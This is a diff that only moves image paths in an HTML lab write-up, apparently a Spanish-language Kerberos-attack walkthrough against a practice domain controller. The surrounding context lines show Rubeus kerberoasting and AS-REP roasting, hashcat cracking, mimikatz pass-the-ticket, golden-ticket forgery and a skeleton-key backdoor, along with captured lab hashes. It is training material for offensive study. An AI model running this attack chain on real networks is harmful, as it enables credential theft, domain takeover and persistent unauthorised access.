@@ -1038,7 +1038,7 @@ controller<span class="se">\a</span>dministrator
 <h3 id="rubeus">Rubeus<a class="headerlink" href="#rubeus" title="Permanent link">&para;</a></h3>
 <div class="highlight"><pre><span></span><code><span class="p">*</span><span class="n">Evil-WinRM</span><span class="p">*</span> <span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">Administrator</span><span class="p">\</span><span class="n">Downloads</span><span class="p">&gt;</span> <span class="p">.\</span><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">harvest</span> <span class="p">/</span><span class="n">interval</span><span class="p">:</span><span class="n">30</span>
 </code></pre></div>
-<p><img alt="alt text" src="image.png" /></p>
+<p><img alt="alt text" src="img/image.png" /></p>
 <p>Agregamos el dominio al hosts de windows</p>
 <div class="highlight"><pre><span></span><code><span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;10.201.29.113 CONTROLLER.local&#39;</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\d</span>rivers<span class="se">\e</span>tc<span class="se">\h</span>osts
 
@@ -1093,7 +1093,7 @@ controller<span class="se">\a</span>dministrator
 <h3 id="kerberoasting-w-rubeus-impacket">Kerberoasting w/ Rubeus &amp; Impacket<a class="headerlink" href="#kerberoasting-w-rubeus-impacket" title="Permanent link">&para;</a></h3>
 <div class="highlight"><pre><span></span><code><span class="p">.\</span><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">kerberoast</span>
 </code></pre></div>
-<p><img alt="alt text" src="image-1.png" /></p>
+<p><img alt="alt text" src="img/image-1.png" /></p>
 <p>Guardamos el Hash generado con Rubeus.</p>
 <div class="highlight"><pre><span></span><code>cat<span class="w"> </span>hash.txt<span class="w">      </span>
 <span class="nv">$krb5tgs$23$*</span>SQLService<span class="nv">$CONTROLLER</span>.local<span class="nv">$CONTROLLER</span>-1/SQLService.CONTROLLER.local:30111*<span class="nv">$07</span>D083365FB5F970FC297F75B6A3988C<span class="nv">$256</span>F5D89FBD0318A76869C3159EA83D5903EB35FEE8E1958D6E518523A40152C1A90C816D43B266647DE4E5CF152BB4AE5F20DD46A3C12E7F8FE5E15B3954CC8DA55392505C5C99B68D6E6A01D5CB8385D58B483456848855162360A367454E9C9FB2A9551A92F17DB99BC00D9333508880D4ED834736F2122D2B82361DFD1BC175F34748124C7DE122B1D5CF0EFCB0E3E11839DEC1650AB4F4A126339DA99C035EC711543B76C903924CE65EE481361083956CBB9D651FF24DE4D95D017F9E6D4350F77FAB7EDD2D4B3B446952AA9E95DA6C001A9D0D3C503BC918A1245DF65B3A85E1CD4D43E5978AD4F23CC973894F267997404B24510CAA243AEC52A4DBFCF22B45E11472B3479C7AB909695F6168892DEEF0E5F86C002A81CC52745192C3827302982EFB91429CF11D683D223B82F300050C80CBF5C1C5497DA30371BDDEE821C8858C39B31C016D8E7D469258FF9C5E665452B78E62B671404350A937A3A72E3E5D5D009BD2D3741AF9CA9D37D952E45D83F96E749FBCFAB9C161ACC3F4A6428019F353F19C00E272933277EB3EA120ACED5844D097361ACBBF3C335E64D059E09801D1CF674E90E7EF8152B519C27AA3D6F47BCBE987D65251C22736833734C89F0826B1867717A5DBCB3CF52B2A30C5D0440DB5CCDC5EAD000D0FBB2F9B67F69293B93D07D5F0D5449658BBFD2968A9C664EFE058464B4B1CF98D53327E7B0138C08F1DD22DD04C2EF5DA42F4F86CC13C95CEB417C199A033E46DBA190D8852C30D239DC6D2780A6F284E7586490C6B054C23296F3DF660CA522D05F404394ADCBB69D65E363D148EF77B7C3DF0AB812458F499266C81C3A9458B39C19F3CB1343257EF90FF9937F0AAFD43EC44331D07DD379FAD69BAA2E9EF177FFC0D61AD0C833C4E324D211562C1B3D8BC15580BF3D2D568FF544D0F9B6615F822B70935E4131E3DC702DC21AE234D6A205C911C18D0F42DCEE2D1FDB0C337B87111E79E4AFA0276C6F4C3C086E3329660C8231BC487D821A841E871C9B4557C024AF1365B5B9D9D89E55796B6C91010AF697BA6CB1A315A444D23EF21E82EC076E7C0E56727448EF96896C8786C2904711DA468A8DD6977706D104FB8C4105428D5BCB7F39DA564260776C18200FCA08469ED0982645950CADA4B1F41F149726DE647ED25F8160439AF039739A1411C8C48507A76029C6EBC22C0ECE50E6C4CF97C9448660692ECBA0D8876462A6BBBAD8306B9492B1DD59651C769C8FBEA0E483954487A0135C2AC793D4D4D14A798030B32C659427189A4C60E32191893FCEBB2C350F683CAE8702C29800A2992A0B06570AC442530C5990D97FF982B4AB57CB2746EDF1938AD443844056FA517613BB2F374CFF986782BE6B9F84091EF85CB7D53A37BCEA7C5693D036A8EF86FE2450AC0756FD7EE450D1C047BF88BF3E2846DE0AE2A54B13F38FA4A858A8C77857735873F1B3357AB0B63F205AC99453F74517E26F7DA6BCA8D39CF4F12000BEE1B38F05CC1BD5FA018D68649CEB42E26AABDA82E8AEDF3718EF20A4961C5CCCC0CC4A07BB15B04D85F554D5F37E6DA71355AD11B78D49DC884322193E833ACAF555F56FFD6D017D904F9C69E07AE9951FBA1A7ACB8B6B38776E5D57FE00D0C2D5
@@ -1104,7 +1104,7 @@ controller<span class="se">\a</span>dministrator
 <p>Crack de contraseñas</p>
 <div class="highlight"><pre><span></span><code>hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">13100</span><span class="w"> </span>-a<span class="w"> </span><span class="m">0</span><span class="w"> </span>hash.txt<span class="w">  </span>passwords.txt
 </code></pre></div>
-<p><img alt="alt text" src="image-2.png" /></p>
+<p><img alt="alt text" src="img/image-2.png" /></p>
 <p>Agregamos nuestra nueva contraseña </p>
 <table>
 <thead>
@@ -1126,7 +1126,7 @@ controller<span class="se">\a</span>dministrator
 <p>Crack del http service</p>
 <div class="highlight"><pre><span></span><code>hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">13100</span><span class="w"> </span>-a<span class="w"> </span><span class="m">0</span><span class="w"> </span>hash_http_service.txt<span class="w"> </span>passwords.txt<span class="w"> </span>****
 </code></pre></div>
-<p><img alt="alt text" src="image-3.png" /></p>
+<p><img alt="alt text" src="img/image-3.png" /></p>
 <table>
 <thead>
 <tr>
@@ -1152,7 +1152,7 @@ controller<span class="se">\a</span>dministrator
 <h3 id="as-rep-roasting-w-rubeus">AS-REP Roasting w/ Rubeus<a class="headerlink" href="#as-rep-roasting-w-rubeus" title="Permanent link">&para;</a></h3>
 <div class="highlight"><pre><span></span><code><span class="p">.\</span><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">asreproast</span>
 </code></pre></div>
-<p><img alt="alt text" src="image-4.png" /></p>
+<p><img alt="alt text" src="img/image-4.png" /></p>
 <p>Guardamos nuestros nuevos hash encontrados.</p>
 <div class="highlight"><pre><span></span><code>cat<span class="w"> </span>hash_admin2.txt<span class="w">      </span>
 <span class="nv">$krb5asrep$Admin2</span>@CONTROLLER.local:65670B034E85DC7A84C4CAC6DF16B351<span class="nv">$47</span>A82FD49F58E4183616252B083617B19B12AC28FDC2523B28A4CA2F77BEE1C526AB411DF8220B51DB2AEA207469FDDB2CE8F023CD62B7E48E62D0127A066A14D6C245EA551A10D74559F6F8013E00C95722D31EEDF44869EB2C47B65F060434233988B8763CD92F34134983492864A53F527A3252A2E7B662BA92D37A9675B8F7C7888FB3562507DA9F4C8FB5DFB4F7A137668841FD62BE22EAF4C182D27E12EB3D8828C64A5EFFB72798E4ED600E2F3BDDF08DFE2C8C2160284483E72591DF0D65CE8C108D4CB40A1D521820F46DF861D493115B95C0F744FE6FC31EEB2789645461385C6214354E39A9C47C7CB5AF82003E9E
@@ -1163,10 +1163,10 @@ cat<span class="w"> </span>hash_user3.txt<span class="w"> </span>
 <p>Crack de los Hash</p>
 <div class="highlight"><pre><span></span><code>hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">18200</span><span class="w"> </span>-a<span class="w"> </span><span class="m">0</span><span class="w"> </span>hash_admin2.txt<span class="w"> </span>passwords.txt<span class="w">  </span>
 </code></pre></div>
-<p><img alt="alt text" src="image-5.png" /></p>
+<p><img alt="alt text" src="img/image-5.png" /></p>
 <div class="highlight"><pre><span></span><code>hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">18200</span><span class="w"> </span>-a<span class="w"> </span><span class="m">0</span><span class="w"> </span>hash_user3.txt<span class="w"> </span>passwords.txt
 </code></pre></div>
-<p><img alt="alt text" src="image-6.png" /></p>
+<p><img alt="alt text" src="img/image-6.png" /></p>
 <table>
 <thead>
 <tr>
@@ -1193,15 +1193,15 @@ cat<span class="w"> </span>hash_user3.txt<span class="w"> </span>
 
 <span class="n">mimikatz</span> <span class="c"># sekurlsa::tickets /export</span>
 </code></pre></div>
-<p><img alt="alt text" src="image-7.png" /></p>
-<p><img alt="alt text" src="image-8.png" /></p>
+<p><img alt="alt text" src="img/image-7.png" /></p>
+<p><img alt="alt text" src="img/image-8.png" /></p>
 <div class="highlight"><pre><span></span><code>mimikatz<span class="w"> </span><span class="c1"># kerberos::ptt [0;7fbb3]-2-0-40e10000-Administrator@krbtgt-CONTROLLER.LOCAL.kirbi</span>
 </code></pre></div>
-<p><img alt="alt text" src="image-9.png" /></p>
-<p><img alt="alt text" src="image-10.png" /></p>
+<p><img alt="alt text" src="img/image-9.png" /></p>
+<p><img alt="alt text" src="img/image-10.png" /></p>
 <div class="highlight"><pre><span></span><code><span class="nb">dir </span><span class="p">\\</span><span class="n">10</span><span class="p">.</span><span class="n">201</span><span class="p">.</span><span class="n">99</span><span class="p">.</span><span class="n">85</span><span class="p">\</span><span class="n">admin</span><span class="p">$</span>
 </code></pre></div>
-<p><img alt="alt text" src="image-11.png" /></p>
+<p><img alt="alt text" src="img/image-11.png" /></p>
 <p>Golden/Silver Ticket Attacks w/ mimikatz</p>
 <div class="highlight"><pre><span></span><code><span class="p">.\</span><span class="n">mimikatz</span><span class="p">.</span><span class="n">exe</span>
 
@@ -1209,17 +1209,17 @@ cat<span class="w"> </span>hash_user3.txt<span class="w"> </span>
 
 <span class="n">lsadump</span><span class="p">::</span><span class="n">lsa</span> <span class="p">/</span><span class="n">inject</span> <span class="p">/</span><span class="n">name</span><span class="p">:</span><span class="n">krbtgt</span>
 </code></pre></div>
-<p><img alt="alt text" src="image-12.png" /></p>
+<p><img alt="alt text" src="img/image-12.png" /></p>
 <p>Guardamos el SID y el NTLM</p>
 <div class="highlight"><pre><span></span><code>/sid:<span class="w"> </span>S-1-5-21-432953485-3795405108-1502158860
 /krbtgt:<span class="w"> </span>72cd714611b64cd4d5550cd2759db3f6
 </code></pre></div>
 <div class="highlight"><pre><span></span><code><span class="n">kerberos</span><span class="p">::</span><span class="n">golden</span> <span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="n">Administrator</span> <span class="p">/</span><span class="n">domain</span><span class="p">:</span><span class="n">controller</span><span class="p">.</span><span class="n">local</span> <span class="p">/</span><span class="n">sid</span><span class="p">:</span><span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">432953485</span><span class="p">-</span><span class="n">3795405108</span><span class="p">-</span><span class="n">1502158860</span> <span class="p">/</span><span class="n">krbtgt</span><span class="p">:</span><span class="n">72cd714611b64cd4d5550cd2759db3f6</span> <span class="p">/</span><span class="n">id</span><span class="p">:</span><span class="n">500</span>
 </code></pre></div>
-<p><img alt="alt text" src="image-13.png" /></p>
+<p><img alt="alt text" src="img/image-13.png" /></p>
 <div class="highlight"><pre><span></span><code><span class="n">misc</span><span class="p">::</span><span class="n">cmd</span>
 </code></pre></div>
-<p><img alt="alt text" src="image-14.png" /></p>
+<p><img alt="alt text" src="img/image-14.png" /></p>
 <div class="highlight"><pre><span></span><code><span class="n">lsadump</span><span class="p">::</span><span class="n">lsa</span> <span class="p">/</span><span class="n">inject</span> <span class="p">/</span><span class="n">name</span><span class="p">:</span><span class="n">administrator</span>
 <span class="n">Domain</span> <span class="p">:</span> <span class="n">CONTROLLER</span> <span class="p">/</span> <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">432953485</span><span class="p">-</span><span class="n">3795405108</span><span class="p">-</span><span class="n">1502158860</span>
 <span class="n">NTLM</span> <span class="p">:</span> <span class="n">2777b7fec870e04dda00cd7260f7bee6</span>
@@ -1228,11 +1228,11 @@ cat<span class="w"> </span>hash_user3.txt<span class="w"> </span>
 <span class="n">Domain</span> <span class="p">:</span> <span class="n">CONTROLLER</span> <span class="p">/</span> <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">432953485</span><span class="p">-</span><span class="n">3795405108</span><span class="p">-</span><span class="n">1502158860</span>
 <span class="n">NTLM</span> <span class="p">:</span> <span class="n">cd40c9ed96265531b21fc5b1dafcfb0a</span>
 </code></pre></div>
-<p><img alt="alt text" src="image-15.png" /></p>
-<p><img alt="alt text" src="image-16.png" /></p>
+<p><img alt="alt text" src="img/image-15.png" /></p>
+<p><img alt="alt text" src="img/image-16.png" /></p>
 <div class="highlight"><pre><span></span><code><span class="n">kerberos</span><span class="p">::</span><span class="n">golden</span> <span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="n">Administrator</span> <span class="p">/</span><span class="n">domain</span><span class="p">:</span><span class="n">controller</span><span class="p">.</span><span class="n">local</span> <span class="p">/</span><span class="n">sid</span><span class="p">:</span><span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">432953485</span><span class="p">-</span><span class="n">3795405108</span><span class="p">-</span><span class="n">1502158860</span> <span class="p">/</span><span class="n">krbtgt</span><span class="p">:</span><span class="n">2777b7fec870e04dda00cd7260f7bee6</span> <span class="p">/</span><span class="n">id</span><span class="p">:</span><span class="n">500</span>
 </code></pre></div>
-<p><img alt="alt text" src="image-17.png" /></p>
+<p><img alt="alt text" src="img/image-17.png" /></p>
 <p>Kerberos Backdoors w/ mimikatz</p>
 <div class="highlight"><pre><span></span><code><span class="p">.\</span><span class="n">Mimikatz</span><span class="p">.</span><span class="n">exe</span>
 
@@ -1240,7 +1240,7 @@ cat<span class="w"> </span>hash_user3.txt<span class="w"> </span>
 
 <span class="n">misc</span><span class="p">::</span><span class="n">skeleton</span>
 </code></pre></div>
-<p><img alt="alt text" src="image-18.png" /></p>
+<p><img alt="alt text" src="img/image-18.png" /></p>
 <p>Accessing the forest - </p>
 <p>The default credentials will be: "<em>mimikatz</em>"  </p>
 <p>example: <code>net use c:\\DOMAIN-CONTROLLER\admin$ /user:Administrator mimikatz</code> - The share will now be accessible without the need for the Administrators password</p>
